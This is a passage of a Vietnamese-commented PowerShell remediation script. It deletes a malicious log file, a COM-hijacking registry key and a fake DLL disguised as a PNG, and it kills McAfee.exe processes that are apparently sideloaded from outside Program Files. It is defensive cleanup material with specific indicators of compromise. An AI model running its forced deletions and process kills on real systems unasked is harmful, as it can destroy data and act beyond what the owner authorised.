    Write-Host " [+] Da ket thuc va tieu huy tệp: $instellPath" -ForegroundColor Green
}
$logPath = "C:\Windows\system32\httpcom.log"
if (Test-Path $logPath) {
    Remove-Item $logPath -Force
    Write-Host " [+] Da xoa tệp nhat ky ma doc: $logPath" -ForegroundColor Green
}

# -------------------------------------------------------------
# 2. XỬ LÝ MẪU 2: GỠ BỎ COM HIJACKING & FILE GIẢ ẢNH DLL
# -------------------------------------------------------------
Write-Host "[2/4] Kiem tra COM Hijacking Registry Key..." -ForegroundColor Yellow

$comKey = "HKCU:\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}"
if (Test-Path $comKey) {
    Remove-Item -Path $comKey -Recurse -Force
    Write-Host " [+] Da xoa bo khoa COM Hijack: $comKey" -ForegroundColor Green
}

# Rà soát trong toàn bộ hồ sơ người dùng (All User AppData)
Get-ChildItem "C:\Users\*\AppData\Roaming\main_background.png" -Force -ErrorAction SilentlyContinue | ForEach-Object {
    Remove-Item $_.FullName -Force
    Write-Host " [+] Da xoa DLL gia mao: $($_.FullName)" -ForegroundColor Green
}

# -------------------------------------------------------------
# 3. XỬ LÝ MẪU 3: RÀ SOÁT TIẾN TRÌNH MCAFEE BỊ SIDELOAD
# -------------------------------------------------------------
Write-Host "[3/4] Kiem tra tien trinh McAfee.exe bi Sideloading..." -ForegroundColor Yellow

Get-Process -Name "McAfee" -ErrorAction SilentlyContinue | ForEach-Object {
    $procPath = $_.Path
    # Neu tien trinh McAfee chay tu mot thu muc KHONG thuoc Program Files
    if ($procPath -notmatch "^C:\\Program Files" -and $procPath -notmatch "^C:\\Program Files \(x86\)") {
        Write-Warning " [!] PHAT HIEN TIEN TRINH MCAFEE DOC HAI TAI: $procPath (PID: $($_.Id))"
        Stop-Process -Id $_.Id -Force
        Write-Host " [+] Da buoc dung tien trinh McAfee doc hai PID $($_.Id)" -ForegroundColor Green
        
        # Di chuyển thư mục khả nghi vào vùng cách ly
        $parentDir = Split-Path $procPath
        Write-Host " [i] Thu muc nguon khuyen nghi cach ly: $parentDir" -ForegroundColor Yellow
    }
}

# -------------------------------------------------------------
# 4. TỔNG KẾT
# -------------------------------------------------------------
Write-Host "[4/4] He thong da hoan tat quy trinh ra soat va lam sach!" -ForegroundColor Cyan
Write-Host "=== XU LY SU CO HOAN TAT AN TOAN ===" -ForegroundColor Green
```

---
